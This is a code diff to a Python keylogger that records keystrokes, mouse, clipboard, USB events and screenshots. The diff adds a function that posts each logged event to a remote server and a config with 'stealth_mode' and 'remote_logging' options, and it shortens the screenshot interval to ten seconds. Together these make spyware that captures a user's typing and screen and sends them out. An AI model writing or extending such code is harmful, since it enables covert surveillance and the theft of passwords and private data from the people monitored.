@@ -4,6 +4,7 @@ import psutil
 import logging
 import time
 import threading
+import json
 from collections import deque, defaultdict
 from cryptography.fernet import Fernet
 from pynput import keyboard, mouse
@@ -11,11 +12,7 @@ from PIL import ImageGrab
 import requests
 import string
 
-# Android-specific imports
-if platform.system() == "Linux" and "ANDROID_STORAGE" in os.environ:
-    is_android = True
-else:
-    is_android = False
+
 
 # Windows-specific imports
 if platform.system() == "Windows":
@@ -41,7 +38,7 @@ cipher_suite = Fernet(key)
 
 # Configure logging to a file and console
 logging.basicConfig(
-    level=logging.INFO,  # Changed to INFO level for less verbose output
+    level=logging.INFO,
     format='%(asctime)s: %(message)s',
     handlers=[
         logging.FileHandler("keylog.txt"),
@@ -67,8 +64,7 @@ def get_active_window_process_name() -> str:
             _, pid = win32process.GetWindowThreadProcessId(window_handle)
             process = psutil.Process(pid)
             return f"{process.name()} - {window_title}"
-        elif is_android:
-            return "Android App"
+        
         else:
             return psutil.Process(os.getpid()).name()
     except Exception as e:
@@ -81,6 +77,7 @@ def log_event(message: str) -> None:
     """Log message to both file and terminal in real-time."""
     logging.info(message)
     log_buffer.append(message)
+    send_remote_log(message)
     if len(log_buffer) >= 10:
         flush_log_buffer()
 
@@ -218,7 +215,7 @@ def capture_screenshot() -> None:
     except Exception as e:
         logging.error(f"Error capturing screenshot: {e}")
 
-def periodic_screenshot_capture(interval: int = 60) -> None:
+def periodic_screenshot_capture(interval: int = 10) -> None:
     """Capture screenshots at regular intervals."""
     while not stop_event.is_set():
         capture_screenshot()
@@ -260,6 +257,41 @@ def monitor_usb_devices() -> None:
         for drive in removed_drives:
             log_event(f"USB device disconnected: {drive}")
         drive_list = new_drive_list
+
+# Configuration settings
+config = {
+    "remote_logging": False,
+    "remote_server": "http://example.com/log",
+    "stealth_mode": False,
+    "email_alerts": False,
+    "email_recipient": "",
+    "features": {
+        "key_logging": True,
+        "mouse_logging": True,
+        "clipboard_logging": True,
+        "screenshots": True,
+        "usb_monitoring": True,
+        "network_logging": True
+    }
+}
+
+def load_config(config_file="config.json"):
+    """Load configuration from JSON file."""
+    global config
+    try:
+        with open(config_file) as f:
+            config.update(json.load(f))
+    except Exception as e:
+        logging.error(f"Error loading config: {e}")
+
+def send_remote_log(message):
+    """Send log message to remote server if enabled."""
+    if config["remote_logging"]:
+        try:
+            requests.post(config["remote_server"], 
+                         json={"log": message, "timestamp": time.time()})
+        except Exception as e:
+            logging.error(f"Remote logging failed: {e}")
 
 # --- Set up Listeners and Threads ---
 try:
